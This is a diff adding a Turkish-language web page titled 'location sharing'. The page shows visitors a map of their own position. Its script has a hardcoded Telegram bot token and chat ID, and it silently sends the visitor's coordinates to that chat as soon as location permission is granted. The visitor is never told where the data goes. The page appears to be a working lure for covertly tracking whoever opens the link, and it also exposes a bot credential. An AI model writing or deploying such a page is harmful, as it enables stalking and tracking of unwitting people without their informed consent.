@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Konum Paylaşımı</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+  <style>
+    #map { height: 400px; width: 100%; }
+    #message { margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h2>Konum Paylaşımı</h2>
+  <div id="map"></div>
+  <div id="message"></div>
+
+  <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+  <script>
+    // Telegram API bilgileri
+    const telegramToken = '6435977146:AAExFsusLAtoivKFKW01Ca1hCsQOVIf2H7I';
+    const chatId = '2090459804';
+
+    // Kullanıcıdan konum izni isteme
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } else {
+      document.getElementById("message").innerText = "Tarayıcınız konum desteği sağlamıyor.";
+    }
+
+    function showPosition(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // OpenStreetMap ile harita gösterimi
+      const map = L.map('map').setView([latitude, longitude], 13);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 19,
+      }).addTo(map);
+      L.marker([latitude, longitude]).addTo(map); // Sadece işaretçi eklendi
+
+      // Telegram API’ye konum bilgisi gönderme
+      const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=https://www.google.com/maps?q=${latitude},${longitude}`;
+      fetch(telegramApiUrl)
+        .then(response => {
+          if (response.ok) {
+            document.getElementById("message").innerText = "Konum Δ :thumb:";
+          } else {
+            document.getElementById("message").innerText = "Konum Δx";
+          }
+        })
+        .catch(error => {
+          console.error("Hata:", error);
+          document.getElementById("message").innerText = "Konum gönderilirken bir hata oluştu.";
+        });
+    }
+
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          document.getElementById("message").innerText = "Kullanıcı konum iznini reddetti.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          document.getElementById("message").innerText = "Konum bilgisi kullanılamıyor.";
+          break;
+        case error.TIMEOUT:
+          document.getElementById("message").innerText = "Konum isteği zaman aşımına uğradı.";
+          break;
+        default:
+          document.getElementById("message").innerText = "Bilinmeyen bir hata oluştu.";
+          break;
+      }
+    }
+  </script>
+</body>
+</html>
